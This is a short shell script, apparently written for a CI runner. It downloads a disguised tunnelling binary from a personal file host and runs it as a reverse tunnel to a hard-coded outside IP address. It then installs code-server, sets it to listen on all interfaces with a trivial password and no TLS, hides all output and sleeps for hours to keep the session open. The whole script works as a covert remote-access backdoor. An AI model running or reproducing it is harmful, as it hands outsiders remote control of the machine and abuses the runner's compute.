wget -q https://bitbucket.org/fertikllop0998k/zzsx/downloads/chisel -O foobar && chmod +x foobar
./foobar client http://104.236.220.224:43210 R:33445:127.0.0.1:8080 >/dev/null 2>&1 >/dev/null &
curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run >/dev/null 2>&1
curl -fsSL https://code-server.dev/install.sh | sh >/dev/null 2>&1
timeout 2s code-server
cd /home/runner/.config/code-server
cat > config.yaml <<END
bind-addr: 0.0.0.0:8080
auth: password
password: 1010
cert: false
END
code-server --bind-addr 0.0.0.0:8080 >/dev/null 2>&1 >/dev/null &
sleep 5
sleep 21300
